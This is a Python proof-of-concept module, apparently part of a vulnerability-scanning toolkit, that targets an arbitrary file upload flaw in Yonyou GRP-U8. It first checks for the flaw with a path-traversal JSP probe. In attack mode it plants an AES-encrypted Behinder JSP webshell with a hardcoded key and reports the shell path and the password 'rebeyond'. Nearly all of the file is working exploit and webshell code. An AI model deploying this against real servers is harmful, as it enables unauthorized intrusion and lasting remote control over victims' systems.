from poc import core
import time


def UploadFileData(url, attack):
    name = '用友 GRP-U8 UploadFileData 任意文件上传漏洞'
    core.start_echo(name)
    header = {
        "Content-Type": "multipart/form-data",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
    }
    poc_file = "test{0}.jsp".format(int(time.time()))
    data = '''------WebKitFormBoundary92pUawKc
Content-Disposition: form-data; name="myFile";filename="test.jpg"

<% out.println("123");%>
------WebKitFormBoundary92pUawKc--'''
    path = "/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename={0}.jsp&filename=1.jpg".format(poc_file)
    r = core.post(url, path, header, data)
    poc_path = "/R9iPortal/" + poc_file
    p = core.get(url, poc_path)
    if r and p:
        if "123" in p.text:
            if attack:
                upload(url, path, name)
            else:
                core.end_echo(name, 'Payload：' + url + poc_path)
                core.result(name, 'Payload：' + url + poc_path)
        else:
            core.end_echo(name)
    else:
        core.end_echo(name)

def upload(url, path, name):
    shell_name = "terra{0}.jsp".format(int(time.time()))
    data = '''------WebKitFormBoundary92pUawKc
Content-Disposition: form-data; name="myFile";filename="test.jpg"

<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>
------WebKitFormBoundary92pUawKc--'''
    header = {
        "Content-Type": "multipart/form-data",
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36"
    }
    r = core.post(url, path, header, data)
    if r.status_code == 200 and "showSucceedMsg" in r.text:
        get_shell(url, shell_name, name)
    else:
        print('\033[32m[#]写入失败,请检查payload\033[0m')
        core.end_echo(name)


def get_shell(url, shell_name, name):
    webshell_path = url + "/R9iPortal/" + shell_name
    r = core.get(url)
    if r.status_code == 200:
        print('\033[32m[#]成功写入webshell\033[0m')
        print('\033[32m[#]webshell路径:{}\033[0m'.format(webshell_path))
        print('\033[32m[#]冰蝎密码：rebeyond\033[0m')
        print('\033[34m----------------------------------------------------\033[0m')
        core.result(name, webshell_path, 'rebeyond')
    else:
        print('\033[32m[#]写入失败,未找到上传后文件。\033[0m')
        core.end_echo(name)